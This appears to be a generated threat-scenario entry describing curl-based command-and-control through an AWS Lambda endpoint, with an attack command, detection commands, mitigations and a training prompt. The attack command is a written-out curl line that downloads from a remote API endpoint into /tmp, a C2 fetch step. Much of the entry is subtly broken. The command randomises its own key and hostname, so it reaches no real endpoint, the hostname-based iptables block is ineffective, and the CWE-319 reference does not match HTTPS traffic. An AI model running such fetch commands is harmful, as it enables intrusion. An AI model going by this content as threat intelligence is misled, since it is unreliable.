---
type: campaign
scenario_id: 422
tactic: Command and Control
technique: "T1071.001: Application Layer Protocol: Web Protocols"
technique_id: T1071.001
tags: [campaign, lotl, command_and_control]
---

# Using curl to communicate with AWS Lambda for C2.

## Threat Description
Using curl to communicate with AWS Lambda for C2.

## Attack Command
```
curl -H "x-api-key: $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 32)" https://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).execute-api.us-east-1.amazonaws.com/prod/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) -o /tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt
```

## Detection Logic
Monitor curl Lambda: `ps aux | grep curl | grep execute-api`; Network traffic: `tcpdump -i any host execute-api.us-east-1.amazonaws.com`.

## Mitigation
Restrict curl: `chmod 700 /usr/bin/curl`; Block Lambda: `iptables -A OUTPUT -d execute-api.us-east-1.amazonaws.com -j DROP`.

## AI Training Prompt
Train AI to detect curl-based C2 via AWS Lambda by analyzing HTTP headers, Lambda API endpoints, and file creation patterns; recommend API blocking.

## References
- MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
